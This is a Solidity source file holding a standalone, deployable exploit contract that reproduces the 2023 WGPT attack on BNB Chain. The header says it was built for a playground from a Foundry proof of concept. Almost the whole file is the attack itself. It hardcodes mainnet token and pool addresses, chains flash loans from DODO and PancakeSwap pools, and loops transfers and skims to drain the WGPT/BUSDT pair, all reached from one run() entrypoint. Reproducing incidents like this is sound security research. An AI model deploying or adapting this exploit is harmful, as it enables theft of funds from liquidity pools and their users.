// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-WGPT).
// The Foundry PoC runs inline in the test contract: testExploit starts a
// Pancake flash swap, and the test contract itself implements the Pancake V2,
// DODO DPP, and Pancake V3 callbacks. This contract copies that attack into a
// deployable standalone contract with a run() entrypoint. The Foundry-only
// ExpToken deal() is reproduced by the playground config's setup.dealToken.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IWGPT is IERC20 {
    function isSwap() external returns (bool);
    function burnToken() external returns (bool);
    function burnRate() external returns (uint256);
}

interface IPancakeRouterV2 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

interface IPancakePairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function totalSupply() external view returns (uint256);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract WGPTDrain {
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant EXP_TOKEN = IERC20(0xe1272a840F574b68dE861eC5009784e3411cb96c);
    IWGPT private constant WGPT = IWGPT(0x1f415255f7E2a8546559a553E962dE7BC60d7942);
    IPancakeRouterV2 private constant ROUTER = IPancakeRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePairV2 private constant BUSDT_EXP_TOKEN_PAIR =
        IPancakePairV2(0xaa07222e4c3295C4E881ac8640Fbe5fB921D6840);
    IPancakePairV2 private constant WGPT_BUSDT_PAIR =
        IPancakePairV2(0x5a596eAE0010E16ed3B021FC09BbF0b7f1B2d3cD);
    IDPPOracle private constant DPP_ORACLE_1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle private constant DPP_ORACLE_2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle private constant DPP_ORACLE_3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle private constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle private constant DPP_ADVANCED = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IPancakeV3Pool private constant PANCAKE_V3_POOL =
        IPancakeV3Pool(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);

    uint256 private constant PANCAKE_V3_BORROW = 76_727_748_945_585_195_946_976;

    function run() external {
        EXP_TOKEN.approve(address(ROUTER), type(uint256).max);
        BUSDT.approve(address(ROUTER), type(uint256).max);
        WGPT.approve(address(this), type(uint256).max);

        bytes memory swapData =
            hex"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000027b46536c66c8e3000000000000000000000000000000000000000000000000002a5a058fc295ed000000000000000000000000000000000000000000000000000000000000000000008c00000000000000000000000000000000000000000000065a4da25d3016c00000";

        if (WGPT.isSwap()) {
            WGPT.burnToken();
        }
        require(WGPT.burnRate() == 2000, "unexpected burn rate");

        BUSDT_EXP_TOKEN_PAIR.swap(BUSDT.balanceOf(address(BUSDT_EXP_TOKEN_PAIR)) / 10, 90e18, address(this), swapData);
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata data) external {
        BUSDT.transfer(address(WGPT), 1);
        BUSDT.transfer(address(WGPT_BUSDT_PAIR), 2);
        DPP_ORACLE_1.flashLoan(0, BUSDT.balanceOf(address(DPP_ORACLE_1)), address(this), data);
        EXP_TOKEN.transfer(address(WGPT_BUSDT_PAIR), 10);
        EXP_TOKEN.transfer(address(WGPT), 100);
        BUSDT.transfer(address(BUSDT_EXP_TOKEN_PAIR), amount0);
        EXP_TOKEN.transfer(address(BUSDT_EXP_TOKEN_PAIR), 90_909 * 1e15);
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == address(DPP_ORACLE_1)) {
            DPP_ORACLE_2.flashLoan(0, BUSDT.balanceOf(address(DPP_ORACLE_2)), address(this), data);
        } else if (msg.sender == address(DPP_ORACLE_2)) {
            DPP_ORACLE_3.flashLoan(0, BUSDT.balanceOf(address(DPP_ORACLE_3)), address(this), data);
        } else if (msg.sender == address(DPP_ORACLE_3)) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), data);
        } else if (msg.sender == address(DPP)) {
            DPP_ADVANCED.flashLoan(0, BUSDT.balanceOf(address(DPP_ADVANCED)), address(this), data);
        } else {
            PANCAKE_V3_POOL.flash(address(this), PANCAKE_V3_BORROW, 0, bytes(""));
        }
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(WGPT);
        ROUTER.swapExactTokensForTokens(200_000 * 1e18, 0, path, address(this), block.timestamp + 1000);
        require(WGPT.burnRate() == 2000, "unexpected burn rate");
        BUSDT.transfer(address(WGPT), 30_000 * 1e18);
        EXP_TOKEN.transfer(address(WGPT_BUSDT_PAIR), 1e6);
        EXP_TOKEN.transfer(address(WGPT), 1);

        while (WGPT_BUSDT_PAIR.totalSupply() > 100_200 * 1e18) {
            WGPT.transferFrom(address(this), address(WGPT_BUSDT_PAIR), WGPT.balanceOf(address(this)) / 99);
            WGPT_BUSDT_PAIR.skim(address(this));
        }

        EXP_TOKEN.transfer(address(WGPT_BUSDT_PAIR), 2000);
        EXP_TOKEN.transfer(address(WGPT), 1000);
        path[0] = address(WGPT);
        path[1] = address(BUSDT);
        uint256[] memory amounts = ROUTER.getAmountsOut(WGPT.balanceOf(address(this)) - 128e18, path);
        WGPT.transfer(address(WGPT_BUSDT_PAIR), WGPT.balanceOf(address(this)));
        WGPT_BUSDT_PAIR.swap(0, amounts[1], address(this), bytes(""));
        BUSDT.transfer(address(PANCAKE_V3_POOL), PANCAKE_V3_BORROW + fee0);
    }
}
